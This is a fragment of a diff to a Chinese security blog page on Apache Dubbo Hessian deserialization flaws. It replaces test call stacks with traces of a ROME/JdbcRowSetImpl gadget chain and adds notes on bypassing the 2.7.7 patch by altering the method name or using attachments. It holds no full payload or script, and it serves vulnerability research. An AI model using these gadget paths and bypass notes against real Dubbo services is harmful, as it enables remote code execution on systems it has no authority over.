-decode:177, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
+beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
+hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
+hash:339, HashMap (java.util)
+put:612, HashMap (java.util)
+doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
+readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
+readObject:2123, Hessian2Input (com.alibaba.com.caucho.hessian.io)
+readObject:2104, Hessian2Input (com.alibaba.com.caucho.hessian.io)
+readObject:102, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
+readAttachments:87, ObjectInput (org.apache.dubbo.common.serialize)
+decode:165, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
 decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
 decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
 received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
@@ -667,22 +595,43 @@ runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
 run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
 run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
 run:748, Thread (java.lang)
-</code></pre><p>calc2</p>
-<pre><code>toString:442, RpcInvocation (org.apache.dubbo.rpc)
-valueOf:2994, String (java.lang)
-append:131, StringBuilder (java.lang)
-getInvoker:267, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)
-reply:123, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
-received:155, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
-received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
-received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
+</code></pre><p>反序列化</p>
+<pre><code>getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
+invoke:-1, GeneratedMethodAccessor11 (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+toString:158, ToStringBean (com.rometools.rome.feed.impl)
+toString:129, ToStringBean (com.rometools.rome.feed.impl)
+beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
+hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
+hash:339, HashMap (java.util)
+putMapEntries:515, HashMap (java.util)
+putAll:785, HashMap (java.util)
+decode:171, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
+decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
+decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
+received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
 run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
 runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
 run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
 run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
 run:748, Thread (java.lang)
-</code></pre><p>calc3</p>
-<pre><code>toString:443, RpcInvocation (org.apache.dubbo.rpc)
+</code></pre><p>后反序列化</p>
+<pre><code>getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
+invoke:-1, GeneratedMethodAccessor11 (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:498, Method (java.lang.reflect)
+toString:158, ToStringBean (com.rometools.rome.feed.impl)
+toString:129, ToStringBean (com.rometools.rome.feed.impl)
+beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
+hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
+toString:236, Object (java.lang)
+valueOf:2994, String (java.lang)
+append:131, StringBuilder (java.lang)
+toString:557, AbstractMap (java.util)
+valueOf:2994, String (java.lang)
+append:131, StringBuilder (java.lang)
+toString:443, RpcInvocation (org.apache.dubbo.rpc)
 safeToString:63, Request (org.apache.dubbo.remoting.exchange)
 toString:143, Request (org.apache.dubbo.remoting.exchange)
 valueOf:2994, String (java.lang)
@@ -692,11 +641,14 @@ runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
 run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
 run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
 run:748, Thread (java.lang)
-</code></pre><h3 id="2-7-7绕过"><a href="#2-7-7绕过" class="headerlink" title="2.7.7绕过"></a>2.7.7绕过</h3><p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/pull/6374">https://github.com/apache/dubbo/pull/6374</a></p>
+</code></pre><p>hashmap.put(key,value)-&gt;key.toString()//java反序列化gadgets</p>
+<h3 id="2-7-7绕过"><a href="#2-7-7绕过" class="headerlink" title="2.7.7绕过"></a>2.7.7绕过</h3><p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/pull/6374">https://github.com/apache/dubbo/pull/6374</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7</a></p>
 <p>DecodeableRpcInvocation</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0</a></p>
-<pre><code class="java">                if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;
+<pre><code class="java">        if (desc.length() &gt; 0) &#123;//sink1//但是attachments 直接就绕过了
+                ...
+                if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;
                     if (!RpcUtils.isGenericCall(path, this.getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, this.getMethodName())) &#123;
                         throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + this.getMethodName());//2.7.6报错退出
                     &#125;
@@ -712,6 +664,8 @@ run:748, Thread (java.lang)
         return &quot;$echo&quot;.equals(method);
     &#125;
 </code></pre><p>改method即可绕过</p>
+<p><code>sink1//但是attachments</code> 也能绕过</p>
+<p><code>sink2</code>触发点在抛出错误前 所以绕过，并且只执行一次</p>
 <h3 id="2-7-9"><a href="#2-7-9" class="headerlink" title="2.7.9"></a>2.7.9</h3><p>2.7.8</p>
 <pre><code>    protected Object decodeEventData(Channel channel, ObjectInput in) throws IOException &#123;
         try &#123;
@@ -1253,7 +1207,7 @@ weblogic.jms.common.
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <input type="text" class="ins-search-input" placeholder="Type something..."/>
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -1265,10 +1219,10 @@ weblogic.jms.common.
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
-            POSTS: '文章',
-            // PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
+            POSTS: 'Posts',
+            // PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
         },
         ROOT_URL: '/',
         CONTENT_URL: '/content.json',
